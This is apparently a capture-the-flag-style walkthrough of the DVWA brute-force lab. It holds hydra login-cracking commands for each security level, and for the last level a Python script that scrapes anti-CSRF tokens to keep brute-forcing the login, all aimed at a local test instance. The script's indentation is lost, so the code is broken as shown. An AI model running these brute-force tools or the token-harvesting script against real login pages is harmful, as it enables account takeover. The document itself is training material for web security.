## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## Security: Low

1. Intercept packet with Burp Suite:

	![](low_burp_proxy.png)

	Things to note down:
	- `GET` request
	- Parameters: `username`, `password`, `Login`
	- `Cookie: PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low`

2. Check for error messages when attempting a random login (via Burp Suite or browser):

3. Create a small username and password lists for efficiency:

	```shell
	cat usernames.txt
	root
	peter
	kevin
	harris
	maria
	andrew
	mike
	sridevi
	pavithra
	admin

	cat passwords.txt
	1234
	123456
	pass
	password123
	qwerty
	qwerty123456
	12345
	1234567890
	qwertyasdfg
	password
	```

3. Build a `hydra` command using the above info:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low:F=Username and/or password incorrect." -t 30
	```

	![](low_hydra.png)

	![](low_success.png)

## Security: Medium

1. Almost identical `hydra` command as before, just change `security=low` to `security=medium`:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=medium:F=Username and/or password incorrect." -t 30
	```

	![](medium_hydra.png)

	> Why the false positive?

	> The command took a bit longer to complete, as a `sleep(2)` function was added to the source code.

## Security: High

1. Same concept as before, this time changing `security=medium` to `security=high`:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=high:F=Username and/or password incorrect." -t 30
	```

	![](high_hydra.png)

	> What's the difference between `Medium` and `High`? The source code adds an Anti-CSRF token, but it does not seem to work.

## Security: Impossible

Resources to read:
- OWASP: [Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)

> The CSRF token is used to add credibility to the origin of the request being received by the server, this token is a impossible to guess random number generated by the server and is sent along with our GET request.

1. Using the `hydra` command won't work this time (`100 valid passwords found` --> all combinations):

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=impossible:F=Username and/or password incorrect." -t
	30
	```

	![](impossible_hydra.png)

2. Due to the added CSRF token, `hydra` can't brute force the credentials. It does not have the ability to collect the CSRF token while making the request:

	![](csrf_token.png)

	![](hidden_to_text.jpg)

	![](token_appearance.png)

	The CSRF token (`user_token`) changes on every attempted login:

3. Create a custom brute-forcing script:

	> 

	Changes needed from the [Security Tutorials article](https://securitytutorials.co.uk/brute-forcing-web-logins-with-dvwa/) (original code taken from [Danny Beton](https://medium.com/@dannybeton/dvwa-brute-force-tutorial-high-security-456e6ed3ae39)):
	1. `sudo pip3 install bs4, 2to3`
	2. `sudo apt install 2to3`
	3. Conversion of the script from Python2 to Python3: `2to3 -w csrf_script.py` 
	4. Modify bs4 import: `from BeautifulSoup import BeautifulSoup as Soup` to `from bs4 import BeautifulSoup as Soup`.

	> Documentation: [bs4](https://pypi.org/project/beautifulsoup4/), [2to3](https://docs.python.org/3/library/2to3.html).  


	```python
	# modified code
	from sys import argv
	import requests
	from bs4 import BeautifulSoup as Soup

	# give our arguments more semantic friendly names
	script, filename, success_message = argv
	txt = open(filename)

	# set up our target, cookie and session
	url = 'http://127.0.0.1:42001/vulnerabilities/brute/index.php'
	cookie = {'security': 'high', 'PHPSESSID':'ud36qu65oddvmncfg54n515nhn'}
	s = requests.Session()
	target_page = s.get(url, cookies=cookie)

	''' 
	checkSuccess
	@param: html (String)

	Searches the response HTML for our specified success message
	'''
	def checkSuccess(html):
	# get our soup ready for searching
	soup = Soup(html, features="lxml")
	# check for our success message in the soup
	search = soup.findAll(text=success_message)
	
	if not search:
	success = False

	else:
	success = True

	# return the brute force result
	return success

	# Get the intial CSRF token from the target site
	page_source = target_page.text
	soup = Soup(page_source, features="lxml");
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

	# Display before attack
	print('DVWA URL' + url)
	print('CSRF Token='+ csrf_token)

	# Loop through our provided password file
	with open(filename) as f:
	print('Running brute force attack...')
	for password in f:

	# strip whitespace
	password = password.strip()
	
	# setup the payload
	payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
	r = s.get(url, cookies=cookie, params=payload)
	success = checkSuccess(r.text)

	if not success:
	# if it failed the CSRF token will be changed. Get the new one
	soup = Soup(r.text, features="lxml")
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
	else:
	# Success! Show the result
	print('Password is: ' + password)
	break

	# We failed, bummer. 
	if not success:
	print('Brute force failed. No matches found.')
	```

	```shell
	# running python script
	python3 csrf_script.py passwords.txt "Welcome to the password protected area admin"
	DVWA URLhttp://127.0.0.1:42001/vulnerabilities/brute/index.php
	CSRF Token=09377057fe6a3b73fe3eb82c6ecce061
	Running brute force attack...
	Password is: password
	```
